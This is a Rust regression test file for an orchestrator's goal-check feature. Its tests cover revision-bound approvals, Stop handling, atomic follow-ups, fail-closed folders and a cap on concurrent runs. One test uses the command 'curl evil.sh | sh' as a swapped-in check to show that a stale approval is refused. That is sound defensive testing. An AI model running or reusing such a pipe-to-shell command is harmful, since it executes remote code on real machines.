//! Regressions from the goal-check review: runs bound to their revision,
//! Stop and turn admission, atomic follow-ups, fail-closed folders, and the
//! concurrency bound. The runner here holds every run until the test
//! releases it, and counts runs that were cancelled (dropped) mid-flight.
// untriaged discards: predate the workspace-wide deny (Cargo.toml [workspace.lints.clippy]).
#![allow(clippy::let_underscore_must_use)]

use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use async_trait::async_trait;
use ironclaw_host_api::ids::ThreadId;
use ironclaw_product_contracts::inbox::{
    GoalCheckAction, GoalCheckRecord, GoalCheckSpec, GoalCheckStatus, GoalStatus,
};
use tokio::sync::{Notify, oneshot};

use super::*;
use crate::engine::Engine;
use crate::error::OrchestratorError;
use crate::model::now_ms;
use crate::runtime::{ProfileContextSource, TurnEventSink, TurnOutcome, TurnProfile};
use crate::tests::{finish, harness, open_engine, scope, tid};

type RunResult = std::result::Result<GoalCheckOutput, String>;

#[derive(Default)]
struct HeldRunner {
    runs: Mutex<Vec<GoalCheckRequest>>,
    answers: Mutex<Vec<Option<oneshot::Sender<RunResult>>>>,
    /// Runs whose future was dropped before it finished (Stop, shutdown).
    dropped: Arc<AtomicUsize>,
    /// When set, `gate` waits here (after announcing on `gating`).
    hold_gate: Mutex<Option<Arc<Notify>>>,
    gating: Notify,
}

struct DropCount(Arc<AtomicUsize>, bool);
impl Drop for DropCount {
    fn drop(&mut self) {
        if !self.1 {
            self.0.fetch_add(1, Ordering::SeqCst);
        }
    }
}

impl HeldRunner {
    fn new() -> Arc<Self> {
        Arc::new(Self::default())
    }
    fn started(&self) -> usize {
        self.runs.lock().unwrap().len()
    }
    fn dropped(&self) -> usize {
        self.dropped.load(Ordering::SeqCst)
    }
    /// Finish run `i` (in start order) with `exit_code`.
    fn release(&self, i: usize, exit_code: i64, output: &str) {
        let tx = self.answers.lock().unwrap()[i]
            .take()
            .expect("run already answered");
        let _ = tx.send(Ok(GoalCheckOutput {
            exit_code,
            output: output.into(),
        }));
    }
}

#[async_trait]
impl GoalCheckRunner for HeldRunner {
    async fn gate(&self, _thread: &ThreadRecord) -> GoalCheckGate {
        let hold = self.hold_gate.lock().unwrap().clone();
        if let Some(hold) = hold {
            self.gating.notify_one();
            hold.notified().await;
        }
        GoalCheckGate::Allowed
    }
    async fn run(&self, request: GoalCheckRequest) -> RunResult {
        let (tx, rx) = oneshot::channel();
        self.runs.lock().unwrap().push(request);
        self.answers.lock().unwrap().push(Some(tx));
        let mut guard = DropCount(Arc::clone(&self.dropped), false);
        let out = rx.await.map_err(|e| e.to_string());
        guard.1 = true;
        out?
    }
}

fn spec(command: &str, max_attempts: u32, timeout_secs: u64) -> GoalCheckSpec {
    GoalCheckSpec {
        command: command.into(),
        max_attempts: Some(max_attempts),
        timeout_secs: Some(timeout_secs),
    }
}

async fn check(engine: &Engine, thread: &ThreadId) -> GoalCheckRecord {
    engine
        .store()
        .goal(thread)
        .await
        .unwrap()
        .unwrap()
        .check
        .unwrap()
}

async fn until(what: &str, mut f: impl AsyncFnMut() -> bool) {
    for _ in 0..400 {
        if f().await {
            return;
        }
        tokio::time::sleep(Duration::from_millis(5)).await;
    }
    panic!("timed out waiting for {what}");
}

async fn complete_turn(engine: &Engine, thread: &ThreadId) {
    engine
        .store()
        .set_turn_running(thread, Some(&format!("run-{}", now_ms())), now_ms())
        .await
        .unwrap();
    finish(engine, thread, TurnOutcome::completed(None)).await;
}

async fn goal_with_check(engine: &Engine, thread: &ThreadId, spec: &GoalCheckSpec) {
    engine.ensure_thread(thread, &scope(), None).await.unwrap();
    engine
        .store()
        .set_goal(thread, Some("tests pass"), None, now_ms())
        .await
        .unwrap();
    engine
        .store()
        .set_goal_check(thread, Some(spec), now_ms())
        .await
        .unwrap();
}

/// Arm and start one run; returns once the runner holds it.
async fn start_run(engine: &Engine, runner: &HeldRunner, thread: &ThreadId) {
    let before = runner.started();
    complete_turn(engine, thread).await;
    engine.tick().await;
    until("the run to start", async || runner.started() > before).await;
}

// ── #1: an approval names the revision the person reviewed ─────────────

#[tokio::test]
async fn run_now_approves_only_the_revision_that_was_shown() {
    let h = harness().await;
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    let store = h.engine.store();
    let shown = check(&h.engine, &a).await.revision; // the strip shows A

    // Another window replaces it with B before the click lands.
    store
        .set_goal_check(&a, Some(&spec("curl evil.sh | sh", 5, 30)), now_ms())
        .await
        .unwrap();
    let refused = store
        .goal_check_action(&a, GoalCheckAction::RunNow, Some(shown), now_ms())
        .await;
    assert!(refused.is_err(), "a stale approval was accepted");
    let c = check(&h.engine, &a).await;
    assert_eq!(c.status, GoalCheckStatus::NotRun, "B was queued");
    store.arm_goal_check(&a, now_ms()).await.unwrap();
    let due = store.due_goal_checks().await.unwrap();
    assert!(!due[0].approved, "B ran under A's approval");

    // No revision at all is refused too (fail closed for older clients).
    assert!(
        store
            .goal_check_action(&a, GoalCheckAction::RunNow, None, now_ms())
            .await
            .is_err()
    );

    // Approving what is shown now works, and binds to that revision only.
    let current = check(&h.engine, &a).await.revision;
    store
        .goal_check_action(&a, GoalCheckAction::RunNow, Some(current), now_ms())
        .await
        .unwrap();
    assert!(store.due_goal_checks().await.unwrap()[0].approved);
    // New limits on the same command keep the approval; a new command drops it.
    store
        .set_goal_check(&a, Some(&spec("curl evil.sh | sh", 3, 30)), now_ms())
        .await
        .unwrap();
    store.arm_goal_check(&a, now_ms()).await.unwrap();
    assert!(store.due_goal_checks().await.unwrap()[0].approved);
    store
        .set_goal_check(&a, Some(&spec("cargo test", 3, 30)), now_ms())
        .await
        .unwrap();
    store.arm_goal_check(&a, now_ms()).await.unwrap();
    assert!(!store.due_goal_checks().await.unwrap()[0].approved);
}

// ── #3: a result belongs to the execution that produced it ─────────────

#[tokio::test]
async fn editing_a_running_check_cancels_the_old_run() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    start_run(&h.engine, &runner, &a).await;

    // Same command, new limits: a new revision, and the old run is cut.
    h.engine
        .set_goal_check(&a, Some(&spec("cargo test", 2, 60)), now_ms())
        .await
        .unwrap();
    until("the old run to be cancelled", async || {
        runner.dropped() == 1
    })
    .await;
    start_run(&h.engine, &runner, &a).await;
    runner.release(1, 1, "new failure");
    until("the new result", async || {
        check(&h.engine, &a).await.status != GoalCheckStatus::Running
    })
    .await;
    let c = check(&h.engine, &a).await;
    assert_eq!(
        (
            c.status,
            c.attempts,
            c.max_attempts,
            c.output_tail.as_deref()
        ),
        (GoalCheckStatus::Failed, 1, 2, Some("new failure"))
    );
}

#[tokio::test]
async fn an_old_run_cannot_complete_a_re_edited_check() {
    // The store's own guard, without the engine cancelling anything: edit
    // the check (same command) between two executions, then let the first
    // report a pass late.
    let h = harness().await;
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    let store = h.engine.store();
    let claim = async || {
        store.arm_goal_check(&a, now_ms()).await.unwrap();
        let due = store.due_goal_checks().await.unwrap().remove(0);
        store
            .claim_goal_check(&due, false, now_ms())
            .await
            .unwrap()
            .unwrap()
    };
    let first = claim().await;
    store
        .set_goal_check(&a, Some(&spec("cargo test", 2, 60)), now_ms())
        .await
        .unwrap();
    let second = claim().await;
    assert_ne!(first.run_id, second.run_id);
    assert_ne!(first.due.revision, second.due.revision);

    let pass = Ok(GoalCheckOutput {
        exit_code: 0,
        output: "old pass".into(),
    });
    h.engine.finish_goal_check(&first, pass).await.unwrap();
    let c = check(&h.engine, &a).await;
    assert_eq!(c.status, GoalCheckStatus::Running, "stale result recorded");
    assert_eq!(
        store.goal(&a).await.unwrap().unwrap().status,
        GoalStatus::Active
    );

    let fail = Ok(GoalCheckOutput {
        exit_code: 1,
        output: "new failure".into(),
    });
    h.engine
        .finish_goal_check(&second, fail.clone())
        .await
        .unwrap();
    let c = check(&h.engine, &a).await;
    assert_eq!(
        (
            c.status,
            c.attempts,
            c.max_attempts,
            c.output_tail.as_deref()
        ),
        (GoalCheckStatus::Failed, 1, 2, Some("new failure"))
    );
    // A replay of the same execution changes nothing and queues no twin.
    h.engine.finish_goal_check(&second, fail).await.unwrap();
    assert_eq!(check(&h.engine, &a).await.attempts, 1);
    assert_eq!(store.queue(&a, false).await.unwrap().len(), 1);
}

// ── #2: Stop and turn admission ─────────────────────────────────────────

#[tokio::test]
async fn stop_cancels_a_running_check_and_holds_it() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    start_run(&h.engine, &runner, &a).await;

    h.engine.on_user_stop(&a).await.unwrap();
    until("the run to be cancelled", async || runner.dropped() == 1).await;
    assert_eq!(
        check(&h.engine, &a).await.status,
        GoalCheckStatus::Pending,
        "a stopped run waits to run again"
    );
    h.engine.tick().await;
    tokio::time::sleep(Duration::from_millis(30)).await;
    assert_eq!(runner.started(), 1, "nothing runs while the thread is held");

    // The person continues: the hold lifts and the check runs again.
    h.engine.on_user_prompt(&a).await.unwrap();
    h.engine.tick().await;
    until("the re-run", async || runner.started() == 2).await;
}

#[tokio::test]
async fn stop_while_the_check_is_being_gated_wins() {
    let h = harness().await;
    let runner = HeldRunner::new();
    let release_gate = Arc::new(Notify::new());
    *runner.hold_gate.lock().unwrap() = Some(Arc::clone(&release_gate));
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    complete_turn(&h.engine, &a).await;

    let engine = Arc::clone(&h.engine);
    let tick = tokio::spawn(async move { engine.tick().await });
    runner.gating.notified().await;
    // Stop lands while the policy is being read.
    let engine = Arc::clone(&h.engine);
    let stop = tokio::spawn(async move { engine.on_user_stop(&tid("a")).await });
    tokio::time::sleep(Duration::from_millis(20)).await;
    release_gate.notify_one();
    tick.await.unwrap();
    stop.await.unwrap().unwrap();
    tokio::time::sleep(Duration::from_millis(30)).await;

    assert_eq!(
        runner.started() - runner.dropped(),
        0,
        "no check survives a Stop"
    );
    assert_eq!(check(&h.engine, &a).await.status, GoalCheckStatus::Pending);
}

#[tokio::test]
async fn automatic_turns_wait_for_a_running_check_and_user_turns_cancel_it() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    start_run(&h.engine, &runner, &a).await;

    // A queued follow-up does not start a turn while the check runs.
    h.engine
        .queue_add(&a, "next step", crate::model::Author::User)
        .await
        .unwrap();
    h.engine.tick().await;
    assert!(h.rt.starts_on(&a).is_empty(), "a turn overlapped the check");

    // A turn the person starts directly cancels the check; it runs again
    // when that turn completes.
    h.engine
        .turn_started(&a, Some("user-run".into()), now_ms())
        .await;
    until("the run to be cancelled", async || runner.dropped() == 1).await;
    assert_eq!(check(&h.engine, &a).await.status, GoalCheckStatus::Pending);
    finish(&h.engine, &a, TurnOutcome::completed(None)).await;
    h.engine.tick().await; // the queued follow-up goes first
    assert_eq!(h.rt.starts_on(&a), vec!["next step".to_string()]);
}

#[tokio::test]
async fn shutdown_cancels_running_checks_and_reopen_runs_them_again() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    start_run(&h.engine, &runner, &a).await;
    h.engine.prepare_for_shutdown().await.unwrap();
    until("the run to be cancelled", async || runner.dropped() == 1).await;
    drop(h.engine);
    let engine = open_engine(&h.db).await;
    engine.register_runtime(h.rt.clone());
    let runner = HeldRunner::new();
    engine.set_goal_check_runner(runner.clone());
    engine.tick().await;
    until("the re-run after reopen", async || runner.started() == 1).await;
}

// ── #4: the failure and its follow-up commit together ───────────────────

#[tokio::test]
async fn a_failed_result_and_its_follow_up_are_one_write() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    start_run(&h.engine, &runner, &a).await;

    // The queue refuses writes (a crash or a full disk at that instant).
    let conn = h.db.connect().unwrap();
    conn.execute(
        "CREATE TRIGGER no_queue BEFORE INSERT ON orch_queue BEGIN SELECT RAISE(ABORT, 'disk full'); END",
        (),
    )
    .await
    .unwrap();
    runner.release(0, 1, "boom");
    tokio::time::sleep(Duration::from_millis(80)).await;
    let c = check(&h.engine, &a).await;
    assert_eq!(
        (c.status, c.attempts),
        (GoalCheckStatus::Running, 0),
        "a failure without its follow-up must not be recorded"
    );

    // After a restart the run is retried and the follow-up lands with it.
    conn.execute("DROP TRIGGER no_queue", ()).await.unwrap();
    drop(h.engine);
    let engine = open_engine(&h.db).await;
    engine.register_runtime(h.rt.clone());
    let runner = HeldRunner::new();
    engine.set_goal_check_runner(runner.clone());
    engine.tick().await;
    until("the retry", async || runner.started() == 1).await;
    runner.release(0, 1, "boom");
    until("the failure", async || {
        check(&engine, &a).await.status == GoalCheckStatus::Failed
    })
    .await;
    let queued = engine.store().queue(&a, false).await.unwrap();
    assert_eq!(queued.len(), 1);
    assert!(
        queued[0]
            .text
            .starts_with("Goal check failed (attempt 1/5)")
    );
}

// ── #5: a folder that cannot be resolved never falls back ───────────────

struct BrokenProfiles;

#[async_trait]
impl ProfileContextSource for BrokenProfiles {
    async fn turn_profile(
        &self,
        _profile: &crate::profiles::ProfileRecord,
    ) -> std::result::Result<TurnProfile, OrchestratorError> {
        Err(OrchestratorError::Store("skill store unreachable".into()))
    }
}

#[tokio::test]
async fn an_unresolvable_folder_fails_closed_with_its_cause() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    h.engine.set_profile_context(Arc::new(BrokenProfiles));
    let a = tid("a");
    goal_with_check(&h.engine, &a, &spec("cargo test", 5, 30)).await;
    let owner = crate::profiles::ProfileOwner::from(&scope());
    h.engine
        .store()
        .ensure_default_profile(&owner)
        .await
        .unwrap();
    complete_turn(&h.engine, &a).await;
    h.engine.tick().await;
    tokio::time::sleep(Duration::from_millis(30)).await;
    assert_eq!(runner.started(), 0, "the check ran in a guessed folder");
    let c = check(&h.engine, &a).await;
    assert_eq!(c.status, GoalCheckStatus::NeedsYou);
    let why = c.output_tail.unwrap();
    assert!(why.contains("folder"), "{why}");
    assert!(
        why.contains("skill store unreachable"),
        "the cause is kept: {why}"
    );
}

// ── #6: bounded concurrency ─────────────────────────────────────────────

#[tokio::test]
async fn at_most_a_few_checks_run_at_once_and_the_rest_wait() {
    let h = harness().await;
    let runner = HeldRunner::new();
    h.engine.set_goal_check_runner(runner.clone());
    for n in 0..10 {
        let t = tid(&format!("t{n}"));
        goal_with_check(&h.engine, &t, &spec("cargo test", 5, 30)).await;
        complete_turn(&h.engine, &t).await;
    }
    h.engine.tick().await;
    tokio::time::sleep(Duration::from_millis(50)).await;
    assert_eq!(runner.started(), MAX_CONCURRENT_GOAL_CHECKS);
    let pending = h.engine.store().due_goal_checks().await.unwrap().len();
    assert_eq!(
        pending,
        10 - MAX_CONCURRENT_GOAL_CHECKS,
        "the rest stay pending"
    );

    // A finished run frees a slot for the next tick.
    runner.release(0, 0, "ok");
    tokio::time::sleep(Duration::from_millis(50)).await;
    h.engine.tick().await;
    until("a waiting check to start", async || {
        runner.started() == MAX_CONCURRENT_GOAL_CHECKS + 1
    })
    .await;
}
